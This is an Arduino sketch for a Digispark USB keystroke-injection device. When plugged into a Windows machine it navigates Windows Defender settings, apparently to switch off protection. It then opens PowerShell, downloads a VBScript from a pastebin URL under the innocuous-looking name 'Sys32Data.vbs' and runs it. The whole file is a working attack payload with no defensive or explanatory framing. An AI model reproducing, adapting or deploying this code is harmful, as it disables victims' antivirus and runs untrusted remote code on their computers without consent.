#include "DigiKeyboard.h"

void setup() {
 DigiKeyboard.delay(3000);
 DigiKeyboard.sendKeyStroke(KEY_M, MOD_GUI_LEFT);
 DigiKeyboard.delay(5000);
 DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);
 DigiKeyboard.delay(5000);
 DigiKeyboard.println("windows defender settings");
 DigiKeyboard.delay(5000);
 DigiKeyboard.print("\t");//Press Tab
 DigiKeyboard.delay(5000);
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(5000); 
 DigiKeyboard.print("\t");//Press Tab
 DigiKeyboard.delay(5000);
 DigiKeyboard.print("\t");//Press Tab
 DigiKeyboard.delay(5000);
 DigiKeyboard.print("\t");//Press Tab
 DigiKeyboard.delay(5000);
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(4000);
 DigiKeyboard.sendKeyStroke(KEY_SPACE);
 DigiKeyboard.delay(7000);
 DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
 DigiKeyboard.delay(5000);
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(2000);
 DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
 DigiKeyboard.delay(1000);
 DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);

 int d =3000;
 DigiKeyboard.delay(5000);
 DigiKeyboard.sendKeyStroke(KEY_M, MOD_GUI_LEFT);
 DigiKeyboard.delay(d);
 DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);
 DigiKeyboard.delay(d);
 DigiKeyboard.print("windows powershell");
 DigiKeyboard.delay(5000);
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(3000);
 DigiKeyboard.print("$client = new-object System.Net.WebClient");
 DigiKeyboard.delay(1000);
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(6000);
 DigiKeyboard.print("$client.DownloadFile('https://pastebin.com/raw/fkWtLQgU', 'Sys32Data.vbs')");
 DigiKeyboard.delay(3000);
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(2000);
 DigiKeyboard.print("start Sys32Data.vbs");
 DigiKeyboard.delay(1000);
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(2000);
 DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
 DigiKeyboard.delay(5000);
 
} 

void loop() {
  // put your main code here, to run repeatedly:

}
